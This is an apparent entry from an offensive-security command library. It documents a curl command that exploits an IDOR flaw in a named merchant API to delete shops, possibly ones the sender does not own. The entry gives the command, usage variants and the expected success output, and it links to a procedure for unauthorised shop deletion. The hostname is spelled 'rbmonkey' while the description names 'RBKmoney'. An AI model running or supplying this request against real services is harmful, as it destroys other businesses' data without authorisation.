---
id: curl-idor-delete-001
data: >-
  curl -X POST 'https://merchant.rbmonkey.com/api/shops/12345/delete' -H
  'Authorization: Bearer YOUR_AUTH_TOKEN' -H 'Content-Type: application/json' -d
  '{}'
tags:
  - idor
  - deletion
  - web
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.038Z'
verified: false
validated: true
submitted: true
---
# curl-idor-delete

## Command

```bash
curl -X POST 'https://merchant.rbmonkey.com/api/shops/12345/delete' \
  -H 'Authorization: Bearer YOUR_AUTH_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{}'
```

## Description

This command exploits an IDOR vulnerability by sending a deletion request to a specific shop ID in the RBKmoney merchant API, potentially targeting unauthorized shops if access controls are missing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://merchant.rbmonkey.com/api/shops/12345/delete` | Deletion endpoint with target shop ID | Yes |
| `-H 'Authorization: Bearer YOUR_AUTH_TOKEN'` | Auth header | Yes |
| `-H 'Content-Type: application/json'` | JSON content type | Yes |
| `-d '{}'` | Empty JSON body (if no params needed) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://merchant.rbmonkey.com/api/shops/12345/delete' -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' -d '{}'
```

### Advanced Usage

```bash
curl -X POST 'https://merchant.rbmonkey.com/api/shops/12345/delete' -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' -d '{}' -v
```

## Expected Output

Success response: {"message": "Shop deleted successfully"} or HTTP 200.

## Related

- [[commands/curl-verify-auth]]
- [[procedures/Exploit-IDOR-for-Unauthorized-eShop-Deletion]]
